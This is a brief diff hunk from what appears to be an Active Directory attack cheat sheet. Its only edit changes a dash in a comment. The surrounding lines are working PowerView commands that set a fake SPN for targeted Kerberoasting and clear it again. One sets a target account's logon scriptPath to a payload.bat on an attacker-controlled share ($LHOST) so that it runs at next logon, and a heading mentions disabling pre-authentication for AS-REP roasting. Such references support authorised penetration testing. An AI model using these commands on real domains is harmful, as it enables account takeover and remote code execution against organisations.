@@ -139,7 +139,7 @@ Set-DomainObject -Identity $TARGET -Set @{serviceprincipalname="fake/spn.$DOMAIN
 # Clear an SPN (clean up after targeted Kerberoasting)
 Set-DomainObject -Identity $TARGET -Clear serviceprincipalname
 
-# Set scriptPath (logon script abuse — runs on next logon)
+# Set scriptPath (logon script abuse, runs on next logon)
 Set-DomainObject -Identity $TARGET -Set @{scriptpath="\\$LHOST\share\payload.bat"}
 
 # Disable pre-authentication (make account AS-REP roastable)
